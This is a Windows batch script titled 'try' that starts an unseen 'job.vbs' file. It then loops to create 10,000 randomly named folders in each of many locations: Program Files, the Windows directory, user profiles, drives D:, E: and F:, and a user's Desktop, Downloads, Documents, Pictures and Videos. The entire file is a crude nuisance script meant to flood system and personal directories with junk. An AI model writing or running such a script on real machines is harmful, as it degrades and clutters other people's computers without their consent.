@echo off
title try
color 02
echo HEllo

start job.vbs

set i=0
:a1
cd C:\Program Files
set b=%random%%random%
md %b%
set /a i=%i%+1
pause
if %i% NEQ 10000 goto a1

set j=0
:a2
cd C:\Windows
set c=%random%%random%
md %c%
set /a j=%j%+1

if %j% NEQ 10000 goto a2

set k=0
:a3
cd C:\Users
set d=%random%%random%
md %d%
set /a k=%k%+1

if %k% NEQ 10000 goto a3


set l=0
:a4
cd C:\Users\Public
set e=%random%%random%
md %e%
set /a l=%l%+1

if %l% NEQ 10000 goto a4


set m=0
:a5
cd C:\Users\%username%
set f=%random%%random%
md %f%
set /a m=%m%+1

if %m% NEQ 10000 goto a5


set n=0
:a6
cd C:\Program Files (x86)
set g=%random%%random%
md %g%
set /a n=%n%+1

if %n% NEQ 10000 goto a6

set o=0
:a7
cd C:\Users\ROHIT\Desktop
set h=%random%%random%
md %h%
pause
set /a o=%o%+1
if %o% NEQ 10000 goto a7

set p=0
:a8
cd D:\
set h=%random%%random%
md %h%
set /a p=%p%+1
if %p% NEQ 10000 goto a8

set q=0
:a9
cd E:\
set h=%random%%random%
md %h%
set /a q=%q%+1
if %q% NEQ 10000 goto a9

set r=0
:a10
cd F:\
set h=%random%%random%
md %h%
set /a r=%r%+1
if %r% NEQ 10000 goto a10

set s=0
:a11
cd C:\Users\ROHIT\Desktop
set h=%random%%random%
md %h%
set /a s=%s%+1
if %s% NEQ 10000 goto a11

set t=0
:a12
cd C:\Users\ROHIT\Downloads
set h=%random%%random%
md %h%
set /a t=%t%+1
if %t% NEQ 10000 goto a12

set u=0
:a13
cd C:\Users\ROHIT\Documents
set h=%random%%random%
md %h%
set /a u=%u%+1
if %u% NEQ 10000 goto a13

set v=0
:a14
cd C:\Users\ROHIT\Pictures
set h=%random%%random%
md %h%
set /a v=%v%+1
if %v% NEQ 10000 goto a14

set w=0
:a15
cd C:\Users\ROHIT\Videos
set h=%random%%random%
md %h%
set /a w=%w%+1
if %w% NEQ 10000 goto a15
